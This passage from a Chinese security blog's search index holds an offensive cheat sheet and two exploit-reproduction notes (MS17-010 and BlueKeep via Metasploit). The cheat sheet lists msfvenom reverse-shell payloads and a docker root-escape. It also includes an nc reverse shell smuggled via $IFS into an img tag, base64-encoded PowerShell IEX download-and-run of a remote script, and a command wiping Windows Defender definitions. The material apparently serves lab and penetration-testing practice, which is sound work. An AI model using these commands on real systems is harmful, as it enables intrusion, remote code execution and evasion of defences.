findstr /i <span class="hljs-string">&quot;auto&quot;</span> | findstr /i /v <span class="hljs-string">&quot;C:\windows&quot;</span><br><br><span class="hljs-comment"># C:\Local\Bad Program\command.exe</span><br><span class="hljs-comment"># icacls &quot;C:\Local&quot;</span><br><span class="hljs-comment"># BUILTIN\Users:(W)</span><br><br><span class="hljs-comment"># msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=80 -f exe -o Program.exe</span><br><span class="hljs-comment"># or</span><br><span class="hljs-comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw &gt; met.bin</span><br><span class="hljs-comment"># Use shellter injection .bin in binary program (ex. whoami.exe)</span><br><span class="hljs-comment"># rename whoami.exe -&gt; Bad.exe -&gt; C:\Local\</span><br></code></pre></div></td></tr></table></figure><p>group in docker</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker run -v /:/mnt --rm -it alpine chroot /mnt sh<br></code></pre></div></td></tr></table></figure><br/><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32<br>i686-w64-mingw32-gcc 1198.c -o ms05-018.exe -lws2_32 advapi32.lib<br><br><span class="hljs-comment"># 64 bit and 32 bit</span><br>i686-w64-mingw32-gcc -o win32.exe win32.c<br>x86_64-w64-mingw32-gcc -o win64.exe win32.c<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gcc -Wl,--hash-style=both -o exp exploit.c<br></code></pre></div></td></tr></table></figure><p>可写目录</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 可写目录</span><br>C:\Windows\System32\spool\drivers\color<br></code></pre></div></td></tr></table></figure><p>可读文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 可读文件</span><br>C:\Windows\win.ini<br></code></pre></div></td></tr></table></figure><p>go 不同架构系统编译</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># GOOS : darwin, freebsd, linux, windows</span><br><span class="hljs-comment"># GOARCH : 386, amd64, arm</span><br><br>GOOS=linux GOARCH=amd64 go build -o linux_64<br>GOOS=linux GOARCH=386 go build -o i386_64<br><br>GOOS=windows GOARCH=amd64 go build -o win_64<br>GOOS=windows GOARCH=386 go build -o win_32<br></code></pre></div></td></tr></table></figure><p>Nc one line</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.16.3&#x27;$IFS&#x27;4444&#x27; --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://10.10.16.3/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;<span class="hljs-attr">10.10.16.3</span>&#x27;$<span class="hljs-attr">IFS</span>&#x27;<span class="hljs-attr">4444</span>&#x27;) /&gt;</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 调用 Powershell IEX() 引号问题</span><br><span class="hljs-comment"># ...cmd(&#x27;powershell &quot;IEX()&quot;&#x27;)</span><br><br>powershell <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.11.1.11/callme.ps1&#x27;)&quot;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.11.1.11/callme.ps1&#x27;)&quot;</span> | iconv -t UTF-16LE | base64 -w 0<br><br><span class="hljs-comment"># SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMQAuADEALgAxADEALwBjAGEAbABsAG0AZQAuAHAAcwAxACcAKQAKAA==</span><br></code></pre></div></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-enc</span> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMQAuADEALgAxADEALwBjAGEAbABsAG0AZQAuAHAAcwAxACcAKQAKAA==<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># PROGRA~1 = Program Files</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Program Files\Windows Defender&quot;</span><br><span class="hljs-comment"># or</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\PROGRA~1\Windows Defender&quot;</span><br><br>MpCmdRun.exe -RemoveDefinitions -All<br></code></pre></div></td></tr></table></figure><p>bash 单双引号</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;#!/bin/bash\nrm -rf /TMP/*&quot;</span> &gt; cron<br><span class="hljs-comment"># bash: !/bin/bash\nrm: event not found</span><br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\nrm -rf /TMP/*&#x27;</span> &gt; cron<br><br>cat cron<br><span class="hljs-meta">#!/bin/bash</span><br>rm -rf /TMP/*<br></code></pre></div></td></tr></table></figure><p>echo -n</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63616c632e657865&quot;</span> | wc -c<br><span class="hljs-comment"># 17</span><br><br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;63616c632e657865&quot;</span> | wc -c<br><span class="hljs-comment"># 16</span><br></code></pre></div></td></tr></table></figure><p>小端显示</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1120110D&quot;</span> | tac -rs .. | <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tr -d &#x27;\n&#x27;)</span>&quot;</span><br><span class="hljs-comment"># 0D112011</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MS17-010复现</title>
    <link href="/2019/09/13/MS17_010%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/09/13/MS17_010%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p><a id="more"></a><p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">Microsoft 安全公告 MS17-010</a></p><p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p><p>受影响的系统(详细系统版本请查看公告)：</p><ul><li>Windows Vista</li><li>Windows Server 2008</li><li>Windows 7</li><li>Windows Server 2008 R2</li><li>Windows 8.1</li><li>Windows Server 2012 和 Windows Server 2012 R2</li><li>Windows RT 8.1</li><li>Windows 10</li><li>Windows Server 2016</li></ul><p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p><ul><li>CVE-2017-0143</li><li>CVE-2017-0144</li><li>CVE-2017-0145</li><li>CVE-2017-0146</li><li>CVE-2017-0148</li></ul><br><p>复现环境：</p><ul><li>Windows 7 (Build 7601, Service Pack 1)</li><li>Ubuntu server(Metasploit)</li></ul><br><p><img src="/assets/img/2019_09_13_MS17_010%E5%A4%8D%E7%8E%B0/2019-09-13-11-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="搜索漏洞"><br><img src="/assets/img/2019_09_13_MS17_010%E5%A4%8D%E7%8E%B0/2019-09-13-11-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="扫描模块"><br><img src="/assets/img/2019_09_13_MS17_010%E5%A4%8D%E7%8E%B0/2019-09-13-10-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="返回 meterpreter"></p>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-0708复现</title>
    <link href="/2019/09/12/CVE_2019_0708%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/09/12/CVE_2019_0708%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>CVE-2019-0708 远程桌面服务的远程代码执行漏洞, 漏洞触发无需用户交互</p><a id="more"></a><blockquote><p>A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka ‘Remote Desktop Services Remote Code Execution Vulnerability’. —— <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708">CVE</a></p></blockquote><br><p>复现环境:</p><ul><li>Windows 7 (Build 7601, Service Pack 1) x64</li><li>Windows server 2008 R2 x64</li><li>Metaspliot (Ubuntu Server)</li></ul><blockquote><p>初始版本的 Exp只适用于64位版本的 Windows 7和 Windows server 2008 R2</p></blockquote><br><p>更新 MSF到最新（<strong>5.0.47</strong>）版本，推荐使用 Curl更新（需要删除旧版）：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall<br></code></pre></div></td></tr></table></figure><br><p>因为这个 pull不是正式的，所以需要自行比对 diff增删或者<strong>直接替换</strong>文件: <a href="https://github.com/rapid7/metasploit-framework/pull/12283/files">Pull 地址</a></p><p>这里已下载完成，可直接替换使用(建议去 Pull下载，万一就更新了呢)：</p><ul><li><a href="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/Tools/rdp.rb">rdp.rb</a></li><li><a href="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/Tools/cve_2019_0708_bluekeep.rb">cve_2019_0708_bluekeep.rb</a></li><li><a href="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/Tools/rdp_scanner.rb">rdp_scanner.rb</a></li><li><a href="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/Tools/cve_2019_0708_bluekeep_rce.rb">cve_2019_0708_bluekeep_rce.rb</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 对应的替换文件</span><br><br>lib/msf/core/exploit/rdp.rb<br>modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb<br>modules/auxiliary/scanner/rdp/rdp_scanner.rb<br>modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb<br></code></pre></div></td></tr></table></figure><br><p><img src="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/2019-09-11-20-43-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="可以正常搜索到"></p><br><p>执行 <code>exploit</code></p><p><img src="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/2019-09-12-12-42-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="按需选择 target"><br><img src="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/2019-09-12-15-36-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="目标机远程选项选第 3项会报无漏洞"><br><img src="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/2019-09-10-14-46-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="返回 shell"><br><img src="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/2019-09-10-20-38-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="返回 meterpreter"><br><img src="/assets/img/2019_09_12_CVE_2019_0708%E5%A4%8D%E7%8E%B0/cve-2019-0708_win2k8_2.gif" alt="Win2k8进行 expliot出现蓝屏重启情况(第一次蓝屏)"></p>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
